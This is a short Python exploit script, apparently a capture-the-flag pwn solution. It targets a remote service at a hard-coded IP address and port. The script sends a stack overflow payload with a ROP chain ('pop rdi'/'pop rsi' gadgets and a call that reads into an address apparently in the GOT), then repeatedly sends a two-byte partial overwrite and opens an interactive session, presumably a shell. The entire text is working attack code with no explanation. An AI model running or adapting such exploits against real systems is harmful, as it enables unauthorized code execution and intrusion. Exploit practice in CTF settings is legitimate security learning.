#from pwn import *
from PwnIOI import *
import time
while 1:
  #s = remote('192.168.0.85',1234)
#  s=IOI(['192.168.0.85',1234])
  s=IOI(['128.199.152.175', 10001])
#  raw_input()
  gadget1 = 0x00000000004005c3 # pop rdi ; ret
  gadget2 = 0x00000000004005c1 # pop rsi ; pop r15 ; ret
  dat = ''
  dat += 'A'*0x18
  dat += p64(gadget1)
  dat += p64(0)
  dat += p64(gadget2)
  dat += p64(0x601018)
  dat += p64(0)
  dat += p64(0x400400)*2
  dat += '\x00'*0x100
  s.write(dat)
  time.sleep(0.2)
  s.write('\x67\x35')
  s.interact()
